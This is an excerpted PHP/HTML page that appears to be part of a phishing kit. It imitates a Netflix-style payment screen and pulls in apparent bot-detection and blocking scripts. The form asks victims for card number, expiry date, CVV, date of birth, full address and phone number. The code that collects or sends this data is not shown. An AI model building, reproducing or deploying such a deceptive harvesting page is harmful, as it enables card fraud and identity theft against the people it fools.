<?php
    include("./style/js/system.php");
    include("./style/js/detect.php");
    include("./style/js/blocker.php");
...
<div style="display: none;" id="mySidenav" class="sidenav">
...
<div  class="centerContainer contextStep firstLoad" data-reactid="9">
    ...
    <div id="orinput" class="paymentContainer" data-reactid="10"><div data-reactid="11">



<div id="Nerctx"><span class="stepLogo regStepLogo"></span></div>
...
<div id="NFX" class="login-wrapper-background"><img class="concord-img vlv-creative" src="./style/css/alpha_website_small.jpg"  alt="">
...
<span for="id_addres" class="placeLabel">Name On Card</span></label>
...
<input required="required" type="text" name="cardnumber" class="cardnumber nfTextField" id="cardnumber" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="cardnumberIdinputError cardnumberinputError" style="background-position: 98.5% -0.2%;">

<span for="id_addres" class="placeLabel">Card Number</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_City" class="placeLabel">Expiry date</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<input required="required" type="text" name="Securitycode" class="nfTextField" id="Securitycode" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="SecuritycodeIdinputError SecuritycodeinputError"  >

<span for="id_State" class="placeLabel">CCV</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<div id="errorrCardnetpas"><div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div style="    padding: 3px 20px;" class="ui-message-contents"></div></div></div>
...
<span for="id_birthdate" class="placeLabel">Date Of Birth (DD/MM/YYYY)</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_addres" class="placeLabel">Address Line</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_City" class="placeLabel">City</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_State" class="placeLabel">State</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_zipCod" class="placeLabel">Zip Code</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_phoneNumber" class="placeLabel">Phone Number</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
